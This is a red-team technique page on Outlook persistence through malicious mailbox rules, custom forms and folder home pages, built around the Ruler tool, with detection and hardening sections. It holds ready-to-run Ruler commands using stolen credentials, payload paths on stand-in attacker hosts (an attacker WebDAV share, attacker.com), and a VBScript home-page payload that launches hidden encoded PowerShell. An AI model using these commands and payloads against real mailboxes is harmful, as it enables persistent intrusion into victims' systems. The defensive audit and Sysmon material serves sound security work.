# Outlook Persistence: Rules, Forms & Home Pages

> **MITRE ATT&CK**: Persistence > T1137.005 (Outlook Rules), T1137.003 (Outlook Forms), T1137.004 (Outlook Home Page)
> **Platforms**: Windows (Outlook desktop client), Exchange Server, Exchange Online
> **Required Privileges**: Valid mailbox credentials (user-level)
> **OPSEC Risk**: Medium (rules and forms sync server-side; detectable via mailbox auditing)

## Strategic Overview

Outlook-based persistence mechanisms exploit the tight integration between Exchange and the Outlook client to achieve code execution that survives reboots, password changes (in some configurations), and standard endpoint remediation. These techniques are particularly valuable because they operate within a trusted application (`outlook.exe`) and persist at the Exchange server level -- meaning they follow the user across any Outlook client that connects to the mailbox. The three primary vectors (malicious rules, custom forms, and folder home pages) were extensively researched by SensePost and weaponized in their **Ruler** tool. Understanding these techniques is critical for red teams targeting enterprise Exchange environments and for defenders building detection around email-based persistence.

## Technical Deep-Dive

### Malicious Outlook Rules (T1137.005)

Exchange mailbox rules can be configured to execute actions when emails matching specific criteria are received. The "Start Application" action enables arbitrary command execution, turning a mailbox rule into a persistent backdoor.

#### How Exchange Rules Sync

```
# Exchange mailbox rules are stored server-side and synchronized to all
# connected Outlook clients via MAPI/RPC or Exchange Web Services (EWS)
#
# Rule storage:
# - Server-side: Exchange mailbox associated rules table
# - Client-side: Cached in the Outlook profile (.ost file)
#
# When a rule with "Start Application" action triggers:
# 1. Email matching rule criteria arrives in mailbox
# 2. Outlook client processes the rule locally
# 3. Outlook calls ShellExecute() on the specified application path
# 4. Payload executes as a child process of outlook.exe
#
# Key detail: The rule triggers on the CLIENT side, not the server
# The Outlook desktop client must be running for execution to occur
```

#### "Start Application" Action and ShellExecute Behavior

```
# The "Start Application" rule action invokes ShellExecute with the
# configured application path. This means:
# - Executable files (.exe) run directly
# - Script files (.bat, .cmd, .vbs, .js) execute via their handler
# - The application runs in the security context of the logged-in user
# - Outlook must be running for the rule to trigger
#
# Limitations:
# - Arguments cannot be passed directly to the application
# - The payload binary must exist on disk or an accessible network path
# - "Start Application" is only available in Outlook (not OWA/web)
```

#### Manual Rule Creation via Outlook GUI

```
# Creating a malicious rule manually (for testing/demonstration):
#
# 1. Outlook > File > Manage Rules & Alerts > New Rule
# 2. "Apply rule on messages I receive"
# 3. Condition: From <attacker-controlled address> or specific subject
# 4. Action: "Start application" (under "more actions")
# 5. Select the payload executable path
# 6. Optionally: "delete the message" to hide the trigger email
# 7. Optionally: "stop processing more rules" to prevent interference
#
# Trigger: Send an email matching the rule criteria to execute payload
```

#### .rwz File Import (Legacy)

```
# Older Outlook versions support importing rules from .rwz files
# File > Options > Import/Export rules
# An attacker with brief mailbox access can import a pre-configured
# malicious rule via .rwz file, then leave
#
# Note: .rwz format is deprecated in modern Outlook but may still be
# supported in some enterprise deployments
```

#### Ruler Tool for Remote Rule Deployment

```bash
# Ruler (SensePost) enables remote rule creation via MAPI/RPC or RPC/HTTP
# without requiring direct Outlook access

# Authenticate and create a malicious rule
ruler -k --email target@corp.com --username target --password 'P@ssw0rd' \
  --url https://autodiscover.corp.com/autodiscover/autodiscover.xml \
  add --trigger "Invoice" --name "Security Update" \
  --location "\\\\attacker-webdav\\share\\payload.exe" --send

# Breakdown:
# -k                     : Ignore TLS certificate errors
# --email                : Target mailbox
# --username/--password  : Compromised credentials
# --url                  : Autodiscover endpoint
# add                    : Create new rule
# --trigger "Invoice"    : Rule triggers on emails with "Invoice" in subject
# --name                 : Display name of the rule
# --location             : Path to payload (UNC path to WebDAV or SMB share)
# --send                 : Automatically send a trigger email

# The --send flag causes Ruler to send a trigger email to fire the rule
# immediately, confirming execution
```

#### WebDAV-Based Payload Hosting

```
# Using WebDAV for payload hosting is preferred because:
# 1. WebDAV paths (\\attacker.com\share\) work over HTTP(S) on port 80/443
# 2. This traverses corporate firewalls that block SMB (port 445)
# 3. Windows WebClient service handles UNC-to-HTTP translation transparently
# 4. The payload does not need to exist on the target's local disk
#
# Setup WebDAV server:
# - Apache with mod_dav
# - Python: wsgidav
# - Windows: IIS with WebDAV publishing
#
# Ensure the WebClient service is running on the target:
# The service starts automatically when a WebDAV path is accessed
# Can be pre-triggered via search indexer tricks if not running
```

#### Rule Visibility and Cleanup

```bash
# List existing rules (for enumeration or cleanup)
ruler -k --email target@corp.com --username target --password 'P@ssw0rd' \
  --url https://autodiscover.corp.com/autodiscover/autodiscover.xml \
  display

# Delete a specific rule by name
ruler -k --email target@corp.com --username target --password 'P@ssw0rd' \
  --url https://autodiscover.corp.com/autodiscover/autodiscover.xml \
  delete --name "Security Update"

# Rules are visible in:
# - Outlook > Manage Rules & Alerts (client-side)
# - Exchange Admin Center (admin view)
# - PowerShell: Get-InboxRule -Mailbox target@corp.com
# - OWA: Settings > Mail > Rules
#
# Note: Rules created via Ruler may appear as unnamed or with garbled
# names in some Outlook versions, which can be a detection indicator
```

---

### Outlook Forms (T1137.003)

Custom Outlook forms can contain embedded VBScript that executes when the form is loaded, providing a persistent code execution mechanism within the Outlook process.

#### Custom Form Regions with Embedded VBScript

```
# Outlook forms are stored in the Forms Library (per-folder or personal)
# A custom form can be associated with a mail item type and will execute
# embedded VBScript when the item is opened or the form is loaded
#
# How it works:
# 1. Attacker creates a custom Outlook form with malicious VBScript
# 2. Form is installed in the target's Personal Forms Library
# 3. The VBScript runs within the Outlook process (outlook.exe)
# 4. Code executes in the context of the current user
# 5. Form persists across Outlook restarts (stored in mailbox)
#
# VBScript in custom forms can:
# - Create COM objects (WScript.Shell, Scripting.FileSystemObject)
# - Execute system commands via Shell()
# - Access the Outlook object model (read mail, send messages)
# - Download and execute payloads from remote servers
```

#### Ruler Tool --form Flag for Remote Form Injection

```bash
# Ruler can remotely install malicious forms via MAPI/RPC

# Install a malicious form
ruler -k --email target@corp.com --username target --password 'P@ssw0rd' \
  --url https://autodiscover.corp.com/autodiscover/autodiscover.xml \
  form add --suffix badform --input /path/to/command.txt

# command.txt contains the command to execute, e.g.:
# powershell.exe -nop -w hidden -enc <BASE64_PAYLOAD>

# Trigger the form (sends an email that loads the custom form)
ruler -k --email target@corp.com --username target --password 'P@ssw0rd' \
  --url https://autodiscover.corp.com/autodiscover/autodiscover.xml \
  form send --suffix badform

# Delete the form (cleanup)
ruler -k --email target@corp.com --username target --password 'P@ssw0rd' \
  --url https://autodiscover.corp.com/autodiscover/autodiscover.xml \
  form delete --suffix badform

# Display installed forms
ruler -k --email target@corp.com --username target --password 'P@ssw0rd' \
  --url https://autodiscover.corp.com/autodiscover/autodiscover.xml \
  form display
```

#### Form Persistence Across Outlook Restarts

```
# Forms installed in the mailbox Forms Library persist because:
# - They are stored server-side in the Exchange mailbox
# - They sync to any Outlook client that connects to the mailbox
# - Restarting Outlook reloads forms from the cached/synced library
# - Password changes alone do not remove installed forms
#
# Removal requires:
# - Manually deleting the form from the Forms Library
# - Ruler form delete command
# - Exchange admin intervention
```

---

### Outlook Home Page (T1137.004)

Each Outlook folder can be configured with a "home page" URL that renders HTML content when the folder is selected. This HTML page can contain ActiveX controls and scripts that execute within the Outlook process.

#### Folder Home Page URL Injection

```
# Each Outlook folder (Inbox, Calendar, etc.) has an optional
# "home page" setting that loads a URL when the folder is selected
#
# How it works:
# 1. Attacker sets the home page URL for a folder (e.g., Inbox)
# 2. When the user clicks on that folder, Outlook renders the URL
# 3. The HTML page loads within an embedded IE/WebBrowser control
# 4. ActiveX controls and VBScript in the page execute within outlook.exe
# 5. The home page setting persists across Outlook restarts
#
# The home page URL is stored in a hidden folder property on Exchange
# This means it syncs to any Outlook client connecting to the mailbox
```

#### Ruler --homepage for Remote Deployment

```bash
# Set a malicious home page on the Inbox folder
ruler -k --email target@corp.com --username target --password 'P@ssw0rd' \
  --url https://autodiscover.corp.com/autodiscover/autodiscover.xml \
  homepage add --url "http://attacker.com/payload.html"

# Display the current home page setting
ruler -k --email target@corp.com --username target --password 'P@ssw0rd' \
  --url https://autodiscover.corp.com/autodiscover/autodiscover.xml \
  homepage display

# Remove the home page (cleanup)
ruler -k --email target@corp.com --username target --password 'P@ssw0rd' \
  --url https://autodiscover.corp.com/autodiscover/autodiscover.xml \
  homepage delete
```

#### Payload HTML Page with Embedded Scripting

```html
<!-- Example home page payload (hosted on attacker server) -->
<!-- Executes when user clicks on the folder with the configured home page -->
<html>
<head>
<script language="VBScript">
' This runs inside Outlook's embedded WebBrowser control
' which historically had full ActiveX/scripting capabilities
Sub Window_OnLoad()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell.exe -nop -w hidden -enc BASE64_PAYLOAD", 0, False
End Sub
</script>
</head>
<body>
Loading...
</body>
</html>

<!-- The page runs every time the user navigates to the folder -->
<!-- This provides repeated execution opportunities -->
```

#### Microsoft's Remediation

```
# Microsoft has disabled Outlook Home Page by default in newer builds:
# - Security update KB4011162 and later restrict home page functionality
# - Registry key controls whether home pages are allowed:
#   HKCU\Software\Microsoft\Office\<version>\Outlook\Security
#   EnableRoamingFolderHomepages = 0 (disabled, default in patched builds)
#
# However, the feature may still be enabled in:
# - Older unpatched Exchange/Outlook deployments
# - Environments where admins explicitly re-enabled it for business needs
# - Organizations slow to deploy security updates
#
# Defensive check:
# Get-ItemProperty "HKCU:\Software\Microsoft\Office\*\Outlook\Security" |
#   Select-Object EnableRoamingFolderHomepages
```

---

## Ruler Tool Reference

[Ruler](https://github.com/sensepost/ruler) is the primary tool for remotely exploiting all three Outlook persistence vectors via MAPI/RPC or RPC over HTTP.

### Common Authentication Flags

```bash
# Basic authentication
ruler --email user@corp.com --username user --password 'pass' --url <autodiscover>

# NTLM authentication hash
ruler --email user@corp.com --username user --hash <NTLM_hash> --url <autodiscover>

# Autodiscover brute-force (find the autodiscover endpoint)
ruler --domain corp.com --brute --users userlist.txt --passwords passlist.txt

# Using an Exchange endpoint directly (bypass autodiscover)
ruler --email user@corp.com --username user --password 'pass' --rpc <exchange-server>

# Ignore TLS errors
ruler -k ...

# Verbose output for debugging
ruler -v ...
```

### Command Summary

| Command | Action | MITRE ID |
|---------|--------|----------|
| `ruler add` | Create malicious mailbox rule with "Start Application" action | T1137.005 |
| `ruler delete` | Remove a rule by name | T1137.005 |
| `ruler display` | List all mailbox rules | T1137.005 |
| `ruler form add` | Install custom form with embedded code | T1137.003 |
| `ruler form send` | Send trigger email to execute installed form | T1137.003 |
| `ruler form delete` | Remove installed custom form | T1137.003 |
| `ruler form display` | List installed custom forms | T1137.003 |
| `ruler homepage add` | Set folder home page URL | T1137.004 |
| `ruler homepage delete` | Remove folder home page URL | T1137.004 |
| `ruler homepage display` | Show current home page setting | T1137.004 |
| `ruler brute` | Brute-force credentials via autodiscover | - |
| `ruler abk dump` | Dump the Global Address List (GAL) | - |

---

## Detection & Evasion

### Detection Strategies

#### Exchange Transport Rules & PowerShell Mailbox Auditing

```powershell
# Audit all mailbox rules across the organization
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    Get-InboxRule -Mailbox $_.PrimarySmtpAddress |
    Where-Object { $_.MoveToFolder -eq $null -and $_.DeleteMessage -eq $true } |
    Select-Object MailboxOwnerId, Name, Description, Enabled
}

# Look specifically for rules with suspicious actions
# Rules with "Start Application" won't show the action in Get-InboxRule output
# but will appear as rules with no standard action visible

# Check for rules created by MAPI/RPC (Ruler-created rules)
# These often have unusual or empty names
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    Get-InboxRule -Mailbox $_.PrimarySmtpAddress |
    Where-Object { $_.Name -match '^\s*$' -or $_.Name.Length -gt 100 }
}

# Check for home page settings via Exchange Management Shell
# (Requires Exchange on-premises admin access)
Get-MailboxFolderStatistics -Identity target@corp.com |
    Where-Object { $_.FolderPath -eq "/Inbox" }
```

#### Sysmon Monitoring for outlook.exe Child Processes

```xml
<!-- Sysmon configuration to detect Outlook spawning suspicious processes -->
<!-- Rule: Alert on outlook.exe spawning cmd.exe, powershell.exe, etc. -->
<RuleGroup name="Outlook Persistence Detection" groupRelation="or">
  <ProcessCreate onmatch="include">
    <ParentImage condition="end with">outlook.exe</ParentImage>
    <Image condition="end with">cmd.exe</Image>
  </ProcessCreate>
  <ProcessCreate onmatch="include">
    <ParentImage condition="end with">outlook.exe</ParentImage>
    <Image condition="end with">powershell.exe</Image>
  </ProcessCreate>
  <ProcessCreate onmatch="include">
    <ParentImage condition="end with">outlook.exe</ParentImage>
    <Image condition="end with">mshta.exe</Image>
  </ProcessCreate>
  <ProcessCreate onmatch="include">
    <ParentImage condition="end with">outlook.exe</ParentImage>
    <Image condition="end with">wscript.exe</Image>
  </ProcessCreate>
  <ProcessCreate onmatch="include">
    <ParentImage condition="end with">outlook.exe</ParentImage>
    <Image condition="end with">cscript.exe</Image>
  </ProcessCreate>
</RuleGroup>

<!-- Any child process of outlook.exe (except expected ones like
     splwow64.exe for printing) should be investigated -->
```

#### Registry Monitoring for Home Page Settings

```
# Monitor for changes to Outlook home page registry keys:
# HKCU\Software\Microsoft\Office\<version>\Outlook\WebView\Inbox\URL
# HKCU\Software\Microsoft\Office\<version>\Outlook\WebView\Calendar\URL
#
# Sysmon Event ID 13 (Registry Value Set) can detect this:
# TargetObject contains: \Outlook\WebView\*\URL
#
# Additionally monitor:
# HKCU\Software\Microsoft\Office\<version>\Outlook\Security\EnableRoamingFolderHomepages
# Changes from 0 to 1 indicate re-enabling the home page feature
```

#### Microsoft Defender for Office 365 Alerts

```
# Defender for Office 365 (Plan 2) provides alerts for:
# - Suspicious inbox rule creation
# - Inbox rule forwarding to external addresses
# - Unusual mailbox access patterns (MAPI/RPC from unexpected IPs)
#
# Relevant alert policies:
# - "Suspicious email forwarding activity"
# - "Unusual increase in email reported as phish"
# - "Suspicious inbox manipulation rule"
#
# Unified Audit Log search:
# Search-UnifiedAuditLog -Operations "New-InboxRule","Set-InboxRule"
#   -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) -ResultSize 5000
```

### What Defenders See

| Technique | Detection Surface |
|-----------|-------------------|
| Malicious Rules | `Get-InboxRule` output, Unified Audit Log, child processes of `outlook.exe` |
| Custom Forms | Forms Library enumeration, unusual MAPI connections, VBScript execution from Outlook |
| Folder Home Pages | Registry keys under `Outlook\WebView`, HTTP connections from `outlook.exe`, ActiveX/script execution |
| Ruler Tool Usage | Unusual MAPI/RPC connections from non-standard clients, autodiscover probing patterns |

---

## Defensive Hardening

### Disable "Start Application" Action

```
# Group Policy: Disable the "Start Application" rule action
# User Configuration > Administrative Templates > Microsoft Outlook
# > Security > Security Form Settings > Custom Form Security
# Set "Allow scripts in one-off Outlook forms" to Disabled

# Registry (direct):
# HKCU\Software\Microsoft\Office\<version>\Outlook\Security
# Value: EnableUnsafeClientMailRules = 0 (DWORD)
```

### Block Custom Forms

```
# Prevent custom form execution via registry:
# HKCU\Software\Microsoft\Office\<version>\Outlook\Security
# Value: DisableCustomFormItemScript = 1 (DWORD)

# Group Policy path:
# User Configuration > Administrative Templates > Microsoft Outlook
# > Security > Security Form Settings
# Enable "Disable custom form scripts"
```

### Disable Folder Home Page Feature

```
# Registry GPO to disable home page feature (may already be default):
# HKCU\Software\Microsoft\Office\<version>\Outlook\Security
# Value: EnableRoamingFolderHomepages = 0 (DWORD)

# Apply via Group Policy to ensure all users are protected
# Verify with: reg query "HKCU\Software\Microsoft\Office" /s /v EnableRoamingFolderHomepages
```

### Additional Hardening

```
# 1. Monitor MAPI/RPC connections - alert on connections from non-standard
#    Outlook client user-agents (Ruler uses a distinct user-agent)
#
# 2. Disable RPC over HTTP if not required (blocks Ruler from external)
#    Exchange > Virtual Directories > RPC configuration
#
# 3. Enable Modern Authentication and disable legacy auth protocols
#    Legacy auth (Basic over MAPI/RPC) is required for Ruler to work
#    Disabling it blocks Ruler entirely
#
# 4. Regularly audit inbox rules organization-wide
#    Schedule weekly Get-InboxRule scans across all mailboxes
#
# 5. Deploy Conditional Access policies requiring MFA for all sign-ins
#    This reduces the risk of credential reuse for Ruler access
```

## Cross-References

- **Phishing Payloads** ([../02-initial-access/phishing-payloads.md](../02-initial-access/phishing-payloads.md)) -- Initial access via phishing that leads to mailbox compromise
- **M365 Initial Access** ([../02-initial-access/office365-initial-access.md](../02-initial-access/office365-initial-access.md)) -- Teams, SharePoint, and other M365-specific initial access vectors
- **Cloud Persistence** ([cloud-persistence.md](cloud-persistence.md)) -- OAuth app persistence and cloud-level persistence mechanisms
- **Registry Persistence** ([registry-persistence.md](registry-persistence.md)) -- Registry-based persistence mechanisms (compare OPSEC trade-offs)
- **Azure Initial Access** ([../13-cloud-security/azure/azure-initial-access.md](../13-cloud-security/azure/azure-initial-access.md)) -- Azure AD attack vectors that complement Exchange-based persistence

## References

- MITRE ATT&CK T1137.005 - Outlook Rules: https://attack.mitre.org/techniques/T1137/005/
- MITRE ATT&CK T1137.003 - Outlook Forms: https://attack.mitre.org/techniques/T1137/003/
- MITRE ATT&CK T1137.004 - Outlook Home Page: https://attack.mitre.org/techniques/T1137/004/
- SensePost Ruler: https://github.com/sensepost/ruler
- SensePost - Outlook Home Page Persistence: https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/
- SensePost - Outlook Forms and Shells: https://sensepost.com/blog/2017/outlook-forms-and-shells/
- NetSPI - Malicious Outlook Rules: https://www.netspi.com/blog/technical-blog/adversary-simulation/malicious-outlook-rules/
- Microsoft - Manage mail flow rules in Exchange Online: https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/mail-flow-rules

---

*This document is intended for authorized security testing and educational purposes only. Always obtain proper authorization before using these techniques against any target.*
